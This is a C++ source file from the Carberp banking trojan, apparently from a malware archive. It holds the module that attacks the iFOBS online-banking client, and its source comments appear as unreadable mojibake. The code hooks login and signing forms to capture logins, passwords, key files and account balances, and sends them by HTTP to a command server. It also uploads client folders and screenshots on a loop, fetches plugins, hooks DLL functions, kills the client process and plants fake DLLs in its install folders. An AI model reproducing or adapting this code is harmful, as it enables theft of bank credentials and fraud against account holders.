/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "GetApi.h"
#include "KeyLogSystems.h"
#include "Memory.h"
#include "Utils.h"
#include "Splice.h"
#include "modules.h"
#include "Plugins.h"
#include "rafa.h"
#include "BotHTTP.h"
#include "Inject.h"
#include "BotCore.h"
#include "StrConsts.h"
#include <shlwapi.h>
#include <shlobj.h>
#include "installer.h"

#include "BotDebug.h"

namespace IFOBSCLIENT
{
	#include "DbgTemplates.h"
}

#define DBG IFOBSCLIENT::DBGOutMessage<>

namespace IFobs
{

const int PROCESS_HASH = 0x9FF6B644; // ifobsclient.exe
const DWORD HashClassEditControl = 0x2ED8AE2E; // TcxCustomInnerTextEdit 
const DWORD HashClassButtonControl = 0xA5AD5F9; // TcxButton
const DWORD HashClassEditComboBox = 0x8EDA56FA; // TcxCustomComboBoxInnerEdit
//��� ���� �����������
const DWORD HashClassLoginForm = 0x918D725B; // TLoginForm.UnicodeClass
const DWORD HashSignAsForm = 0x8225F3D9; // TSignAsForm.UnicodeClass

const int MaxFindedControl = 6;

int pluginInstalled = 0; //0 - ������ ��� �� �������, 1 - ������ �� �����������, 2 - ������ ������� ����������

struct ForFindControl
{
	HWND wnds[MaxFindedControl];
	char* texts[MaxFindedControl];
	int count;
	DWORD hash1, hash2;
};

struct AccBalans
{
	char accNumber[64];
	char accId[64];
	char balans[64];
	char nameBank[128];
	char login[64];
	char pwd1[64];
	char pwd2[64];
	char pathKeys[MAX_PATH];
	int set;
};

//���������� � ����������� ����������� ��� ifobs.plug
struct HookFunc //������� �� ������� �������� ���
{
	char* nameDll; //��� ��� � ������� ��������� nameHookFunc
	char* nameFunc; //��� ������� �� ������� ���������
	DWORD hashOrigFunc; //��� ����������� �������
	char* nameOrigFunc; //��� ����������� ������� (��� ifobs.plug)
};

//����� ���������� � ��� �����, ��� �������
struct NameIniParam
{
	char* app;
	char* key;
};

static HookFunc funcsPlug[] =
{
	{ "VistaDB_D7.bpl", "HProc2", 0xA9782FE7, "OpenDatabaseConnection" },
	{ "RtlData1.bpl", "HProc3", 0x1678D314, "TaskAfterSynchRun" },
	{ "vcl70.bpl", "HProc4", 0x8D55F8B4, "TCustomFormShow" },
	{ "vcl70.bpl", "HProc5", 0x3DF02899, "TCustomFormCloseQuery" },
	{ "RtlStore.bpl", "HProc6", 0xCF6CD66, "GlobalAppStorage" },
	{ "RtlData1.bpl", "HProc7", 0xAFD2F1E2, "FillDataToDBCache" },
	{ 0 }
};

static NameIniParam namesIni[] =
{
	{ "Drops", "PlatSumm" },
	{ "Drops", "FreezeBal" },
	{ "Times", "Status1101" },
	{ "Times", "Status1103" },
	{ "Accounts", "WorkAcnt" },
	{ 0, 0 }
};

//�������� �� ifobs.plug
typedef BOOL ( WINAPI *PInitFunc )(DWORD origFunc, char *funcName);


char folderIFobs[MAX_PATH]; //����� � ������� ��������� �����, ��� ����������� �� ������
char resultGrab[768]; //��������� ������� ��� ������� � ������� � ����� ������

//���� ������ ������� �� ������ ������, ��� ������� ����� ������ �������� ������ 
DWORD btAccept[] = { 0x8DBF3905 /* ������� */, 0x62203A2E /* �������� */, 0x3C797A7A /* Accept */, 
					 0xBEA055E9 /* ϳ������� */, 0xBE1A55FD /* ��������� */, 0xA7A73EE /* Sign */, 0 };
AccBalans dataFromPlug; //������ �� ifobs.plug

//������� ���������� ����������� ��������
static DWORD WINAPI SendScreenshot(void*);

int typeActive = 0; //� ����� ���� ������: 1 - �����������, 2 - ������������

static char* GetAdminUrl( char* url )
{
#ifdef DEBUGCONFIG
	m_lstrcpy( url, "az.zika.in" );
#else
//	string host = GetActiveHostFromBuf2( GetBotHosts(), BOTPARAM_HASH_MAINHOSTS, true );
	string host = GetAzHost();
	if( !host.IsEmpty() )
		m_lstrcpy( url, host.t_str() );
	else
		url = 0;
#endif
	return url;
}

static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
{
	ForFindControl* ffc = (ForFindControl*)lParam;
	DWORD hash = GetWndClassHash(hwnd);
	if( hash == ffc->hash1 || hash == ffc->hash2 )
	{
		ffc->wnds[ffc->count] = hwnd;
		ffc->texts[ffc->count] = GetWndText(hwnd);
		DBG( "IFobs", "find control %08x, text = %s", hwnd, ffc->texts[ffc->count] );
		ffc->count++;
		if( ffc->count >= MaxFindedControl ) return FALSE;
	}
	return TRUE;
}

static void AddStrLog( const char* name, const char* value )
{
	char buf[MAX_PATH];
	m_lstrcpy( buf, name );
	m_lstrcat( buf, ": " );
	if( value )
		m_lstrcat( buf, value );
	if( resultGrab[0] ) m_lstrcat( resultGrab, ", " );
	m_lstrcat( resultGrab, buf );
	m_lstrcat( buf, "\r\n" );
	KeyLogger::AddStrToBuffer( 0, buf, 0 );
	DBG( "IFobs", buf );
}

static void FreeFFC( ForFindControl& ffc )
{
	for( int i = 0; i < ffc.count; i++ ) STR::Free(ffc.texts[i]);
}

//������� � ���������� ������� ����� ��� IFobs, � ��� ������� ����� ����������� ��� �������
static char* GetWorkFolder( char* path, const char* nameFile )
{
	pSHGetFolderPathA( 0, CSIDL_LOCAL_APPDATA,  0, 0, path );
	pPathAppendA( path, "IFobs" );
	pCreateDirectoryA( path, 0 ); //������� �����, ���� �� ���
	pPathAppendA( path, nameFile );
	return path;
}

static DWORD WINAPI SendResultGrab(void*)
{
	char urlAdmin[128];
	if( GetAdminUrl(urlAdmin) )
	{
		TMemory request(1024);
		string azUser = GetAzUser();
		char* urlText = URLEncode(resultGrab);
		fwsprintfA pwsprintfA = Get_wsprintfA();
		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=setlog&log=1&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText );
		THTTP H;
		H.Get(request.AsStr());
		DBG( "IFobs", "�������� ������ resultGrab: '%s'", request.AsStr() );
		STR::Free(urlText);
	}
	return 0;
}

//� ���� ����������� 4-� ��������� ���� �����, ����� ������������ ���� �������� ���� ������� ��� ��������
//� ������� texts ��������� ForFindEditControl ��� ��������� � ��������� �������: 0 - ���� � ������, 
//1 - ������ ��� ������, 2 - ������ ��� ����� �������, 3 - �����
static void GrabData( HWND wnd )
{
	DBG( "IFobs", "������ ������" );
	ForFindControl ffc;
	ClearStruct(ffc);
	resultGrab[0] = 0;
	if( typeActive == 1 ) //���� �����������
	{
		ffc.hash1 = HashClassEditControl;
		ffc.hash2 = -1;
	}
	else //���� �������
	{
		ffc.hash1 = HashClassEditControl;
		ffc.hash2 = HashClassEditComboBox;
	}
	pEnumChildWindows( wnd, EnumChildProc, &ffc );
	fwsprintfA pwsprintfA = Get_wsprintfA();
	char serverKeys[128];
	if( typeActive == 1 ) //���� �����������
	{
		AddStrLog( "Login", ffc.texts[3] );
		AddStrLog( "Password system", ffc.texts[2] );
		AddStrLog( "Password key", ffc.texts[1] );
		AddStrLog( "Path keys", ffc.texts[0] );
		m_lstrcat( resultGrab, ", Client folder: " );
		m_lstrcat( resultGrab, folderIFobs );
		DWORD attr = (DWORD)pGetFileAttributesA(ffc.texts[0]);
		if( attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY) != 0 )
			KeyLogger::AddDirectory( ffc.texts[0], "Keys" );
		VideoLog::Send( "ifobs", 11, resultGrab );
		pwsprintfA( serverKeys, "keys\\%s", ffc.texts[3] );
		VideoProcess::SendFiles( 0, serverKeys, ffc.texts[0], 0, 10, true );
	}
	else
	{
		AddStrLog( "Sign login", ffc.texts[2] );
		AddStrLog( "Sign Password", ffc.texts[1] );
		AddStrLog( "Sign Path", ffc.texts[0] );
		DWORD attr = (DWORD)pGetFileAttributesA(ffc.texts[0]);
		if( attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY) != 0 )
			KeyLogger::AddDirectory( ffc.texts[0], "KeysSign" );
		m_lstrcat( resultGrab, ", Client folder: " );
		m_lstrcat( resultGrab, folderIFobs );
		VideoLog::Send( "ifobs", 12, resultGrab );
		pwsprintfA( serverKeys, "keyssign\\%s", ffc.texts[3] );
		VideoProcess::SendFiles( 0, serverKeys, ffc.texts[0], 0, 10, true );
	}
	RunThread( SendResultGrab, 0 );
	FreeFFC(ffc);
//	KeyLogger::CloseSession();
}

//��� ������ �������
static bool IsBtAccept( HWND wnd, const char* text )
{
	char buf[64];
	if( text == 0 )
	{
		pGetWindowTextA( wnd, buf, sizeof(buf) );
		text = buf;
	}

	DWORD hash = STR::GetHash( (char*)text, 0, false );
	int i = 0;
	while( btAccept[i] && btAccept[i] != hash ) i++; //������� � ������� �����
	if( btAccept[i] ) //������ �������
		return true;
	return false;
}

static HWND GetLoginForm( HWND wnd )
{
	HWND mainWnd = wnd;
	for(;;)
	{
		HWND parent = (HWND)pGetParent(mainWnd);
		if( parent == 0 ) break;
		mainWnd = parent;
	}
	char className[128];
	pGetClassNameA( mainWnd, className, 128 );
	DBG( "IFobs", "parent %08x, '%s', %08x", mainWnd, className, STR::GetHash( className, 0, false ) );
	DWORD hash = GetWndClassHash(mainWnd);
	if( hash != HashClassLoginForm && hash != HashSignAsForm )
	{
		wnd = mainWnd;
		mainWnd = 0;
	}
	if( mainWnd == 0 )
	{
		ForFindControl ffc;
		ClearStruct(ffc);
		ffc.hash1 = HashClassLoginForm;
		ffc.hash2 = HashSignAsForm;
		pEnumChildWindows( wnd, EnumChildProc, &ffc );
		if( ffc.count > 0 )
			mainWnd = ffc.wnds[0];
		else
		{
			pEnumWindows( EnumChildProc, &ffc );
			if( ffc.count > 0 )
				mainWnd = ffc.wnds[0];
		}
	}
	if( mainWnd )
		DBG( "IFobs", "����� ���� ����������� %08x", mainWnd );
	else
		DBG( "IFobs", "���� ����������� ���������" );
	return mainWnd;
}

static void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
{
	if( Msg->message == WM_LBUTTONUP )
	{
		//������� ������ �� �� ������ �������
		if( IsBtAccept( Msg->hwnd, 0 ) )
		{
			HWND parent = (HWND)pGetParent(Msg->hwnd);
			GrabData(parent);
		}
	}
	else
		if( Msg->message == WM_KEYUP && Msg->wParam == VK_RETURN ) //������ ������� Enter
		{
			DBG( "IFobs", "������ ������� Enter" );
			//���� ������� ����
			HWND mainWnd = GetLoginForm(Msg->hwnd);
			
			//���� ��� ������ �� �����
			ForFindControl ffc;
			ClearStruct(ffc);
			ffc.hash1 = HashClassButtonControl;
			ffc.hash2 = -1;
			pEnumChildWindows( mainWnd, EnumChildProc, &ffc );
			//���� ������ �������
			for( int i = 0; i < ffc.count; i++ )
				if( IsBtAccept( ffc.wnds[i], ffc.texts[i] ) )
				{
					//������� ������� ��� ��� ���
					if( pIsWindowEnabled( ffc.wnds[i] ) )
					{
						DBG( "IFobs", "������ ������� �������" );
						GrabData(mainWnd);
						break;
					}
					else
						DBG( "IFobs", "������ ������� �������������" );
				}
			FreeFFC(ffc);
		}
}

static DWORD WINAPI SendBalans( LPVOID p )
{
	char urlAdmin[128];
	VideoLog log( "ifobs" );
	TMemory text(768);
	fwsprintfA pwsprintfA = Get_wsprintfA();
	pwsprintfA( text.AsStr(), "DLL -> Login: '%s', Password system: '%s', Password keys: '%s', Path keys: %s, Client folder: %s", dataFromPlug.login, dataFromPlug.pwd1, dataFromPlug.pwd2, dataFromPlug.pathKeys, folderIFobs );
	log.Send( 0, "����: '%s', ������: '%s', ����: '%s'", dataFromPlug.accNumber, dataFromPlug.balans, dataFromPlug.nameBank );
	log.Send2( 0, text.AsStr() );
	if( GetAdminUrl(urlAdmin) )
	{
		TMemory request(1024);
		string azUser = GetAzUser();
		char* urlBank = URLEncode(dataFromPlug.nameBank);
		char* urlText = URLEncode(text);
//		char* urlText2 = URLEncode(resultGrab);

		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1&ida=%s", urlAdmin, BOT_UID, azUser.t_str(), dataFromPlug.balans, dataFromPlug.accNumber, urlBank, dataFromPlug.accId  );
		THTTP H;
		H.Get(request.AsStr());
		DBG( "IFobs", "�������� ������ 1: '%s'", request.AsStr() );

		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=setlog&log=00&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText );
		H.Get(request.AsStr());
		DBG( "IFobs", "�������� ������ 2: '%s'", request.AsStr() );

//		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=setlog&log=1&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText2 );
//		H.Get(request.AsStr());
//		DBG( "IFobs", "�������� ������ 3: '%s'", request.AsStr() );

		STR::Free(urlBank);
		STR::Free(urlText);
//		STR::Free(urlText2);
		pwsprintfA( request, "keys_dll\\%s", dataFromPlug.login );
		VideoProcess::SendFiles( 0, request, dataFromPlug.pathKeys, 0, 20 );
	}
	return 0;
}

static void WINAPI PutBalans( const char* accNumber, const char* accId, const char* balans, const char* nameBank )
{
	DBG( "IFobs", "acc: '%s', balans: '%s', name bank: '%s'", accNumber, balans, nameBank );
	AccBalans* ab = (AccBalans*)MemAlloc(sizeof(AccBalans));
	m_lstrcpy( dataFromPlug.accNumber, accNumber );
	trimall( dataFromPlug.accNumber, ' ' );

	m_lstrcpy( dataFromPlug.accId, accId );
	trimall( dataFromPlug.accId, ' ' );

	m_lstrcpy( dataFromPlug.balans, balans );
	m_lstrcpy( dataFromPlug.nameBank, nameBank );
	dataFromPlug.set |= 1;
	if( dataFromPlug.set == 3 ) //��� ���� ���������
		RunThread( SendBalans, 0 );
}

static void WINAPI PutPasswords(const char* login, const char* pwd1, const char* pwd2, const char* pathKeys )
{
	DBG( "IFobs", "login: '%s', psw1: '%s', psw2: '%s'", login, pwd1, pwd2 );
	SafeCopyStr( dataFromPlug.login, sizeof(dataFromPlug.login), login );
	SafeCopyStr( dataFromPlug.pwd1, sizeof(dataFromPlug.pwd1), pwd1 );
	SafeCopyStr( dataFromPlug.pwd2, sizeof(dataFromPlug.pwd2), pwd2 );
	SafeCopyStr( dataFromPlug.pathKeys, sizeof(dataFromPlug.pathKeys), pathKeys );
	dataFromPlug.set |= 2;
	if( dataFromPlug.set == 3 ) //��� ���� ���������
		RunThread( SendBalans, 0 );
}

static BYTE* GetPlugin( const char* name, DWORD& size )
{
	string nameFile = BOT::MakeFileName( 0, name );
	BYTE* data = File::ReadToBufferA( nameFile.t_str(), size );
	if( data == 0 )
	{
		data = Plugin::Download( (char*)name, 0, &size, true );
		if( data )
		{
			File::WriteBufferA( nameFile.t_str(), data, size );
		}
	}
	return data;
}

static void DelPlugin( const char* name )
{
	string nameFile = BOT::MakeFileName( 0, name );
	DBG( "IFobs", "������� ������ %s -> %s", name, nameFile.t_str() );
	pDeleteFileA(nameFile.t_str());
}

//������� ����������� �������, ����� ��� ����� ����������
void DeletePlugins()
{
	KillIFobs((void*)2);
	pSleep(5000);
	DelPlugin("ifobs.plug");
	DelPlugin("rtlext.plug");
}

static DWORD WINAPI LoadPluginIFobs(LPVOID)
{
	DBG( "IFobs", "�������� ifobs.plug" );
	DWORD sizeIfobsPlug = 0;
	BYTE* dataIFobsPlug = GetPlugin( "ifobs.plug", sizeIfobsPlug );
	DBG( "IFobs", "�������� RtlExt.plug" );
	DWORD sizeRtlExt = 0;
	BYTE* rtlExt = GetPlugin( "rtlext.plug", sizeRtlExt );
	int res = 1;
	if( dataIFobsPlug && rtlExt )
	{
		DBG( "IFobs", "������� ���������" );
		
		//����� � ����� ������� RtlExt.bpl, ��� ���������� ��� ������ �������
		char pathExtRtl[MAX_PATH];
		GetWorkFolder( pathExtRtl, "RtlExt.bpl" );
		if( File::WriteBufferA( pathExtRtl, rtlExt, sizeRtlExt ) == sizeRtlExt )
		{
			DBG( "IFobs", "������� %s", pathExtRtl );
			res = 2;
		}
		else
			DBG( "IFOBS", "�� ������� ������� %s", pathExtRtl );
	}
	else
		DBG( "IFobs", "�� ������� ��������� �������" );
	pluginInstalled = res;
	MemFree(dataIFobsPlug);
	MemFree(rtlExt);
	return 0;
}

static bool InitPlugin()
{
	bool ret = false;
/*
	DWORD sizeIfobsPlug = 0;
	BYTE* dataIFobsPlug = GetPlugin( "ifobs.plug", sizeIfobsPlug );
	TMemoryDLL ifobsPlug(dataIFobsPlug);
	ifobsPlug.SetNotFree();
*/

	string nameFile = BOT::MakeFileName( 0, "ifobs.plug" );
	HMODULE ifobsPlug = (HMODULE)pLoadLibraryA(nameFile.t_str());

//	PInitFunc InitFunc = (PInitFunc)ifobsPlug.GetProcAddress("InitFunc");
	PInitFunc InitFunc = (PInitFunc)pGetProcAddress( ifobsPlug, "InitFunc" );
	if( InitFunc )
	{
		DBG( "IFobs", "���� InitFunc" );

		if ( InitFunc((DWORD)&PutBalans, "BalanceCallBack") )
			DBG( "IFobs", "BalanceCallBack set ok.");

		if ( InitFunc((DWORD)&PutPasswords, "PasswordsCallBack") )
			DBG( "IFobs", "PasswordsCallBack set ok.");

		HookFunc* fp = funcsPlug;
		bool ok = true;
		while( fp->nameDll )
		{
//			void* plugFunc = (void*)ifobsPlug.GetProcAddress(fp->nameFunc);
			void* plugFunc = (void*)pGetProcAddress( ifobsPlug, fp->nameFunc );
			if( plugFunc )
			{
				DBG( "IFobs", "������� ������� %s", fp->nameFunc );
				DWORD addrRealFunc;
				if( HookApi( fp->nameDll, fp->hashOrigFunc, plugFunc, (PVOID*)&addrRealFunc ) )
				{
					DBG( "IFobs", "���������� ��� �� %s", fp->nameOrigFunc );
					if( InitFunc(addrRealFunc, fp->nameOrigFunc) )
					{
						DBG( "IFobs", "InitFunc �� %s", fp->nameOrigFunc );
						fp++;
						continue;
					}
				}
			}
			ok = false;
			break;
		}
		if( ok )
		{
			RunThread( SendScreenshot, 0 );
			DBG( "IFobs", "ifobs.plug ������� ����������" );
			ret = true;
		}
		else
			DBG( "IFobs", "ifobs.plug �� �����������" );
	}
	//MemFree(dataIFobsPlug);
	return ret;
}

//������� ������� ������� �� ����� ������
DWORD WINAPI SendIFobs(LPVOID)
{
	BOT::Initialize(ProcessUnknown);
	DBG( "IFobs", "������ ������� ��������� �� ������ �� ����� %s", folderIFobs );
//	Bot->CreateFileA( 0, GetStr(IFobsFlagCopy).t_str() );
//	DWORD folderSize = 0;
//	if( !SizeFolderLess( folderIFobs, 1024*1024*350, &folderSize ) )
//	{
//		DBG( "IFobs", "����� ��������� ������ ��������� �������, �� ��������" );
//		return 0;
//	}
//	DBG( "IFobs", "������ ����� %d ����", folderSize );
	char tempFolder[MAX_PATH], clientPrg[MAX_PATH];
	m_memcpy( clientPrg, "Client_prg\\", 11 );
	PathToName( folderIFobs, clientPrg + 11, sizeof(clientPrg) - 11 );
	pGetTempPathA( sizeof(tempFolder), tempFolder );
	char* cryptName = UIDCrypt::CryptFileName( clientPrg + 11, false );
	pPathAppendA( tempFolder, cryptName );
	STR::Free(cryptName);
	if( VideoProcess::FolderIsUpload( clientPrg, tempFolder ) )
	{
		DBG( "IFobs", "��� ����� �� ������ ������ ������������" );
		return 0;
	}
	if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
	pCreateDirectoryA( tempFolder, 0 );
	DBG( "IFobs", "����������� �� ��������� ����� %s", tempFolder );
	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //��������� 2-� ����, ����� ������ ����������� "\0\0"
	*((int*)&(folderIFobs[ m_lstrlen(folderIFobs) ])) = 0; 
	CopyFileANdFolder( folderIFobs, tempFolder );
	DBG( "IFobs", "����������� �� ������" );
	//������� �������� �����
	const char* DelFolders[] = { "DATA", "OldVersion", 0 };
	int i = 0;
	while( DelFolders[i] )
	{
		pPathAppendA( tempFolder, DelFolders[i] );
		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
		DBG( "IFobs", "�������� ����� %s", tempFolder );
		DeleteFolders(tempFolder);
		pPathRemoveFileSpecA(tempFolder);
		i++;
	}
	VideoProcess::SendFiles( 0, clientPrg, tempFolder );
	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
	DeleteFolders(tempFolder);
	DBG( "IFobs", "����������� �� ������ ��������" );
	return 0;
}

//��������� ��� ������������
void Activeted1(LPVOID Sender)
{
	DBG( "IFobs", "Activated1" );
	PKeyLogSystem System = (PKeyLogSystem)Sender;
//	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
		MegaJump(SendIFobs);
	VideoProcess::UpdateSettings( 0, 0, 0, 24 * 60 ); //��� �� ������ ����������� �� ����� �������
	typeActive = 1;
}
//��������� ��� ������������
void Activeted2(LPVOID Sender)
{
	DBG( "IFobs", "Activated2" );
	PKeyLogSystem System = (PKeyLogSystem)Sender;
	typeActive = 2;
}

bool Init( const char* appName )
{
	resultGrab[0] = 0;
	PKeyLogSystem S = KeyLogger::AddSystem( "ifobs", PROCESS_HASH );
	if( S != NULL )
	{
		DBG( "IFobs", "����������� �������" );
		//������ �� ����� �����������
//		char* caption11 = "*iFOBS*��*��*�*";
//		char* caption12 = "*iFOBS*Regis*";
		char* caption11 = "*iFOBS*";
		char* classWnd1 = "*TLoginForm*";
		S->MakeScreenShot = true;
		S->SendLogAsCAB = true;
		//S->OnDeactivate = Deactiveted;
		S->OnMessage = OnMessage;
		
		PKlgWndFilter F1 = KeyLogger::AddFilter(S, true, true, classWnd1, caption11, FILTRATE_PARENT_WND, LOG_ALL, 5);
		m_lstrcpy( folderIFobs, appName ); //�������� ���� � iFOBSClient.exe
		pPathRemoveFileSpecA(folderIFobs); //����� � ������
		if( F1 )
		{
			//KeyLogger::AddFilterText(F1, NULL, caption12 );
			F1->OnActivate = Activeted1;
		}
		//������ �� ����� ������������
//		char* caption21 = "*������*���*"; //"��������� �� �����", "ϳ������� �� �����"
//		char* caption22 = "Sign*";
		char* caption21 = "*..*";
		char* classWnd2 = "*TSignAsForm*";
		PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, true, classWnd2, caption21, FILTRATE_PARENT_WND, LOG_ALL, 5);
		if( F2 )
		{
			//KeyLogger::AddFilterText(F2, NULL, caption22 );
			F2->OnActivate = Activeted2;
		}
		//��������� � ��������� ������ �������� � ��������� �������, ���� �� ����� 10�
		pluginInstalled = 0;
		RunThread( LoadPluginIFobs, 0 );
		for( int i = 0; i < 100; i++ )
			if( pluginInstalled > 0 )
			{
				if( pluginInstalled == 2 )
					InitPlugin();
				break;
			}
			else
				pSleep(100);

#ifdef AmmyyH
		Ammyy::Install(false);
#endif 
		VideoProcess::SetAutorun(true); //����� ������ ������������ � ��������
		VideoProcess::ConnectToServer(0);
	}
	return true;
}

static void FindExe(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel )
{
	DWORD hash = STR::GetHash(Search->cFileName, 0, true);
	if( hash == PROCESS_HASH )
	{
		DBG( "IFobs", "Find %s", FileName );
		TBotStrings* clients = (TBotStrings*)Data;
		clients->Add(FileName);
	}
}

static void FindIFobsClient(TBotStrings* clients)
{
	char* ret = 0;
	DWORD drives = (DWORD)pGetLogicalDrives();
	char drive[] = { 'C', ':', '\\', 0 };
	//���� ������ �� ������� �����
	for( int b = 2; b < 31; b++ )
	{
		if( drives & (1 << b) )
		{
			drive[0] = 'A' + b;
			int tp = (int)pGetDriveTypeA(drive);
			//������� ������ ������� �����
			if( tp == DRIVE_FIXED )
			{
				if( !SearchFiles( drive, "*.exe", true, FA_ANY_FILES, clients, FindExe ) )
				{
					break;
				}
			}
		}
	}
}


DWORD WINAPI KillIFobs( void* p )
{
	int attempts = ((int)p) + 1;
	for( int i = 0; i < attempts; i++ )
	{
		DWORD pid = GetProcessIdByHash(PROCESS_HASH);
		DBG( "IFobs", "Kill pid %d", pid );
		if( pid != DWORD(-1) )
		{
			KillProcess( pid, 1000 );
			break;
		}
		pSleep(1000);
	}
	return 0;
}

//������� ���� ������� ifobs.dat
void CreateFileReplacing( const char* s )
{
	if( s == 0 ) return;
	char ifobsIni[MAX_PATH];
	GetWorkFolder( ifobsIni, "ifobs.ini" );
	const char* end = s + m_lstrlen(s);
	const char* p = s;
	//������ ������ �������� �������� �����
	int i = 0;
	while( p < end && namesIni[i].app )
	{
		const char* p2 = STR::Scan( p, ' ' );
		if( p2 == 0 ) p2 = end;
		char buf[64];
		m_memcpy( buf, p, p2 - p );
		buf[p2 - p] = 0;
		pWritePrivateProfileStringA( namesIni[i].app, namesIni[i].key, buf, ifobsIni );
		p = p2 + 1;
		while( *p == ' ' ) p++;
		i++;
	}
	DBG( "IFobs", "�������� ���� '%s'", ifobsIni );
	VideoProcess::RecordPID( 0, "IFobs", GetProcessIdByHash(PROCESS_HASH) );
}



DWORD WINAPI InstallFakeDll(void*)
{
	const char* dlls[] =
	{
		"nkicnt.dll",
//		"keypro2.dll",
		"libeay32.dll"
	};
	if( BOT::FakeDllIFobsInstalled() ) 
	{
		DBG( "IFobs", "fake.dll ��� �����������" );
		return 0; 
	}

	//�� ����� ����� ���� ����� �������� ������, ���� ��� � �������� ���
	TBotStrings clients;
	FindIFobsClient(&clients);
	if( clients.Count() == 0 ) return 0; //������ ���

	DBG("IFobs", "�������� ���������� fake.dll");
	
	TPlugin intaller(GetStr(EStrFakeDllInstaller));

	// ��������� ������
	if (!intaller.Download(true))
	{
		DBG("IFobs", "������ �� ������� ���������" );
		return 0;
	}

	void* dllBody;
	DWORD dllSize;
	if( !LoadBotPlug( &dllBody, &dllSize ) ) return FALSE;

	DBG("IFobs", "������ ������� ���������, �������� ���������");

	// ��������� ����������
	typedef BOOL (WINAPI *TInstall2)(const char* nameDll, BYTE* dllBody, DWORD dllSize);

	TInstall2 install;
	if (intaller.GetProcAddress(0x4CA88DAD /* Install2 */, (LPVOID&)install))
	{
		char folderClient[MAX_PATH];
		bool installed = false;
		//�������� ����� ��� ��� �����
		BYTE* botData = (BYTE*)MemAlloc(dllSize);
		if( botData )
		{
			for( int i = 0; i < clients.Count(); i++ )
			{
				m_lstrcpy( folderClient, clients[i].t_str() );
				DWORD rand = (DWORD)pGetTickCount();
				int n = rand % ARRAYSIZE(dlls);
				for( int j = 0; j < 5; j++ ) //������ 5 ������� ���������, ������ � ���������� ����� ���� ��-�� ���������� ������ ���, �� ��������� ������� ����� ������� ������
				{
					pPathRemoveFileSpecA(folderClient);
					pPathAppendA( folderClient, dlls[n] );
					m_memcpy( botData, dllBody, dllSize );
					if( install( folderClient, botData, dllSize ) )
					{
						DBG("IFobs", "���������� fake.dll ��� '%s' ������� ���������", clients[i].t_str() );
						installed = true;
						break;
					}
					else
					{
						DBG("IFobs", "���������� fake.dll ��� '%s' �� ���������", clients[i].t_str() );
						n++;
						if( n >= ARRAYSIZE(dlls) ) n = 0;
					}
				}
			}
			MemFree(botData);
		}
		if( installed )
		{
			Bot->CreateFileA( 0, GetStr(EStrFakeDllIFobsFlag).t_str() );
		}
	}
	MemFree(dllBody);
	return 0;
}

//������� ���������� ����������� ��������
static DWORD WINAPI SendScreenshot(void*)
{
	char pathScr[MAX_PATH]; //����� ����������
	GetWorkFolder( pathScr, "scr" );
	for(;;)
	{
		pSleep( 60 * 1000 ); //������ ������ ������ ��������
		//���������� ���������� ����� � ������ ������� �����
		VideoProcess::SendFiles( 0, "ifobs_scr", pathScr, 1, 0 );
	}
}

}
